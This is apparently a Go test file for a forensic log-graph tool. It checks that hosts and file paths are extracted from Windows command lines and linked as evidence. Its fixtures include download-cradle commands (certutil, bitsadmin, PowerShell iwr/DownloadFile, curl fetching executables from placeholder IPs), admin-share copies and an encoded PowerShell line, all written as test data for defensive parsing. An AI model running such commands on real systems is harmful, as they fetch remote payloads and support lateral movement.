// in-package test: コマンド行の引数が指すアドレス・ホスト名とファイルの候補を確かめる。
package pipeline

import (
	"slices"
	"strconv"
	"testing"

	"github.com/Intellectual-Chasen/Oraculum/backend/core"
)

// 引数の文字列から、UNC の host と URL の host とドライブ文字の path を採る。
func TestArgumentNamedObjectsReadsUncHostsAndDrivePaths(t *testing.T) {
	urlHost := []string{"198.51.100.5"}
	for _, testCase := range []struct {
		commandLine string
		hosts       []string
		paths       []string
	}{
		{`net use \\host-b.example.test\c$ /user:x`, []string{"host-b.example.test"}, nil},
		{`cmd /c copy C:\Example\a.exe \\192.0.2.20\c$\Windows\Temp\a.exe`,
			[]string{"192.0.2.20"}, []string{`C:\Example\a.exe`}},
		{`certutil -urlcache -f http://198.51.100.5/x C:\Users\Public\x.exe`, urlHost, []string{`C:\Users\Public\x.exe`}},
		{`bitsadmin /transfer j http://198.51.100.5/x "C:\Example Dir\x y.exe"`, urlHost, []string{`C:\Example Dir\x y.exe`}},
		{`powershell -c "iwr http://198.51.100.5/x -OutFile C:\Example\x.ps1"`, urlHost, []string{`C:\Example\x.ps1`}},
		{`powershell -c iwr http://198.51.100.5/x -OutFile 'C:\Example\y.ps1'`, urlHost, []string{`C:\Example\y.ps1`}},
		{`curl -o C:\Example\x.bin http://198.51.100.5/x`, urlHost, []string{`C:\Example\x.bin`}},
		{`powershell -c "(New-Object Net.WebClient).DownloadFile('HTTPS://web.example.test:8443/a.exe','C:\Example\a.exe')"`,
			[]string{"web.example.test"}, []string{`C:\Example\a.exe`}},
		{`curl http://user@web.example.test/x http://web.example.test`, []string{"web.example.test"}, nil},
		{`curl http://user:pass@web.example.test/x`, []string{"web.example.test"}, nil},
		{`iwr http://[2001:db8::1]:8080/a`, []string{"2001:db8::1"}, nil},
		{`"C:\Windows\System32\certutil.exe" -f C:\Example\z.txt`, nil, []string{`C:\Example\z.txt`}},
		{`C:\Windows\System32\cmd.exe /c "C:\Example\run.exe -a b"`, nil, []string{`C:\Example\run.exe`}},
		{`rundll32 C:\Example\a.dll,Entry`, nil, []string{`C:\Example\a.dll`}},
		{`cmd /c whoami>C:\Example\o.txt&&type x`, nil, []string{`C:\Example\o.txt`}},
		{`\\host-c.example.test\share\tool.exe -x`, []string{"host-c.example.test"}, nil},
		{`net use \\host-d.example.test@SSL@443\dav`, []string{"host-d.example.test"}, nil},
		{`ping \\2001:DB8::1\c$`, []string{"2001:DB8::1"}, nil},
		{`tool.exe \\?\C:\x \\.\pipe\x \\\ x.exe %TEMP%\x.exe C:\Example\ C:\Example\*.exe`, nil, nil},
		// スクリプトの本文は改行で文字列を区切る。先頭の行に空白が無くても、次の行の path を採る。
		{"helper.exe\nC:\\Example\\s.zip -Force", nil, []string{`C:\Example\s.zip`}},
		{"\r\n\ttool.exe\r\nC:\\Example\\t.zip", nil, []string{`C:\Example\t.zip`}},
		// 引用符の中の path の後ろの空白は path に含めない。同じ path を 2 回採らない。
		{`cmd /c "C:\Example\tool.exe "run C:\Example\in.bin" exit" C:\Example\tool.exe`, nil,
			[]string{`C:\Example\tool.exe`, `C:\Example\in.bin`}},
	} {
		hosts, paths := argumentNamedObjects(testCase.commandLine)
		if !slices.Equal(hosts, testCase.hosts) || !slices.Equal(paths, testCase.paths) {
			t.Errorf("%s: hosts %q paths %q, want %q %q",
				testCase.commandLine, hosts, paths, testCase.hosts, testCase.paths)
		}
	}
}

// argumentGraph は、共有の IP と保存先の path を指す 4688 と、プロセスの番号を持たずに
// ホスト名を指す 4688 を並べてグラフを組む。
func argumentGraph(t *testing.T) Graph {
	t.Helper()
	document := "<Events>\n" +
		securityEventXML("101", "4688", logonHostA, "2001-02-03T04:05:00.000Z",
			"NewProcessId", "0x4d2", "NewProcessName", `C:\Windows\System32\cmd.exe`,
			"CommandLine", `cmd /c copy C:\Example\a.exe \\::ffff:192.0.2.20\c$\a.exe`, "ProcessId", "0x10") +
		securityEventXML("102", "4688", logonHostA, "2001-02-03T04:05:10.000Z",
			"CommandLine", `net use \\`+logonHostB+`\c$`) +
		securityEventXML("103", "4624", logonHostB, "2001-02-03T04:05:20.000Z",
			"TargetLogonId", "0x1", "LogonType", "3") +
		"</Events>\n"
	return NewGraph(windowsEventImportResult(t, document), AllMatchConditions())
}

// 生成を記録したプロセスから、引数が指す IP とファイルへ候補が張られる。ファイルは
// そのレコードの端末の範囲の参照だけのノードであり、そのレコードを根拠にする。
func TestArgumentNamedObjectsLinkTheCreatedProcessAsCandidates(t *testing.T) {
	graph := argumentGraph(t)
	address := nodeOf(graph, core.NodeKindIp, "192.0.2.20")
	if address < 0 {
		t.Fatal("the graph holds no ip node for the UNC host")
	}
	var file = -1
	for at, node := range graph.nodes {
		if node.key.Kind == core.NodeKindFile && slices.ContainsFunc(node.key.Values,
			func(value core.NodeIdentityValue) bool {
				return value.Value == core.FilePathKeyValue(`C:\Example\a.exe`)
			}) {
			file = at
		}
	}
	if file < 0 {
		t.Fatal("the graph holds no file node for the copied path")
	}
	if node := graph.nodes[file]; node.observation != core.NodeObservationReferenced || len(node.evidence) != 1 {
		t.Errorf("the file node is %s with %d evidence, want referenced with the one record",
			node.observation, len(node.evidence))
	}
	record := recordOfEvent(t, graph, "101")
	for _, target := range []int{address, file} {
		var found bool
		for _, edge := range graph.edges {
			if edge.kind != core.EdgeKindArgumentNamesObject || edge.target != target {
				continue
			}
			found = true
			if graph.nodes[edge.source].key.Kind != core.NodeKindProcess || edge.state != core.RelationStateCandidate ||
				!slices.Equal(edge.evidence, []int{record}) {
				t.Errorf("edge to %s: source %s state %s evidence %v, want the created process, candidate, the 4688",
					graph.nodes[target].id, graph.nodes[edge.source].key.Kind, edge.state, edge.evidence)
			}
		}
		if !found {
			t.Errorf("no argument_names_object to %s", graph.nodes[target].id)
		}
	}
}

// 生成を記録したプロセスを持たないレコードは、レコードのノードから候補を張る。ホスト名は
// 同じ名前の端末のノードへ結ばず、ホスト名のノードで止まる。
func TestArgumentNamedHostStopsAtTheHostnameNode(t *testing.T) {
	graph := argumentGraph(t)
	host := nodeOf(graph, core.NodeKindDomain, logonHostB)
	if host < 0 {
		t.Fatal("the graph holds no hostname node for the UNC host")
	}
	record := graph.records[recordOfEvent(t, graph, "102")].recordNode
	if !slices.Contains(edgePairsOfKind(graph, core.EdgeKindArgumentNamesObject), [2]int{record, host}) {
		t.Error("the record without a created process does not name the hostname")
	}
	for _, edge := range graph.edges {
		if edge.kind == core.EdgeKindArgumentNamesObject && graph.nodes[edge.target].key.Kind == core.NodeKindTerminal {
			t.Errorf("the argument names the terminal %s", graph.nodes[edge.target].id)
		}
	}
}

// 復号したコマンド行が指す対象にも候補が張られる。コマンド行と復号したコマンド行が同じ
// 対象を指すときは、関係は 1 本で、根拠はそのレコード 1 件である。
func TestDecodedCommandLineNamesObjectsOnce(t *testing.T) {
	line := int64(1)
	graph := graphOfRecords(t, []RecordEntry{{
		Locator: core.RecordLocator{
			SourceFileName: "synthetic.log", PositionKind: core.PositionKindLineNumber, LineNumber: &line,
		},
		Semantics: &RecordSemantics{
			ObservationKind: core.ObservationKind{Raw: []core.RecordField{}},
			Fields: []core.RecordField{
				syntheticField(t, "tmid", core.SemanticKeyTerminalId, "T1"),
				syntheticField(t, "psGUID", core.SemanticKeyProcessId, "{P1}"),
				syntheticField(t, "cmd", core.SemanticKeyProcessCommandLine,
					`powershell -enc AAAA \\192.0.2.30\c$`),
				syntheticField(t, "decoded", core.SemanticKeyProcessDecodedCommandLine,
					`iwr http://198.51.100.5/x -OutFile C:\Example\d.ps1; dir \\192.0.2.30\c$`),
			},
		},
	}})
	address := nodeOf(graph, core.NodeKindIp, "192.0.2.30")
	var file = -1
	for at, node := range graph.nodes {
		if node.key.Kind == core.NodeKindFile && slices.ContainsFunc(node.key.Values,
			func(value core.NodeIdentityValue) bool {
				return value.Value == core.FilePathKeyValue(`C:\Example\d.ps1`)
			}) {
			file = at
		}
	}
	if address < 0 || file < 0 {
		t.Fatalf("ip node %d, file node %d; want both named by the decoded command line", address, file)
	}
	for _, target := range []int{address, file} {
		var edges [][]int
		for _, edge := range graph.edges {
			if edge.kind == core.EdgeKindArgumentNamesObject && edge.target == target {
				edges = append(edges, edge.evidence)
			}
		}
		if len(edges) != 1 || len(edges[0]) != 1 {
			t.Errorf("edges to %s carry evidence %v, want one edge with one record", graph.nodes[target].id, edges)
		}
	}
}

// 1 本のコマンド行から採る対象は maxArgumentObjects 件までである。上限と同じ件数は全部を採り、
// 上限を超えた対象を捨てる。
func TestArgumentNamedObjectsStopAtTheLimit(t *testing.T) {
	for _, testCase := range []struct {
		named, want int
	}{{maxArgumentObjects, maxArgumentObjects}, {maxArgumentObjects + 1, maxArgumentObjects}} {
		commandLine := "net use"
		for index := 1; index <= testCase.named; index++ {
			commandLine += ` \\192.0.2.` + strconv.Itoa(index) + `\c$`
		}
		line := int64(1)
		graph := graphOfRecords(t, []RecordEntry{{
			Locator: core.RecordLocator{
				SourceFileName: "synthetic.log", PositionKind: core.PositionKindLineNumber, LineNumber: &line,
			},
			Semantics: &RecordSemantics{
				ObservationKind: core.ObservationKind{Raw: []core.RecordField{}},
				Fields: []core.RecordField{
					syntheticField(t, "tmid", core.SemanticKeyTerminalId, "T1"),
					syntheticField(t, "cmd", core.SemanticKeyProcessCommandLine, commandLine),
				},
			},
		}})
		if got := len(edgePairsOfKind(graph, core.EdgeKindArgumentNamesObject)); got != testCase.want {
			t.Errorf("%d named objects give %d candidates, want %d", testCase.named, got, testCase.want)
		}
	}
}

// 既定の対象の粒度の要求が、プロセスから指された対象への候補を返す。
func TestArgumentNamedObjectsAppearAtTheObjectGranularity(t *testing.T) {
	subgraph := argumentGraph(t).Query(GraphQuery{Granularity: core.GraphGranularityObject, Depth: 1,
		NodeKinds: []core.NodeKind{core.NodeKindProcess, core.NodeKindIp, core.NodeKindFile}})
	if !slices.ContainsFunc(subgraph.Edges, func(edge core.GraphEdge) bool {
		return edge.Kind == core.EdgeKindArgumentNamesObject
	}) {
		t.Errorf("the object granularity returns %d edges without argument_names_object", len(subgraph.Edges))
	}
}
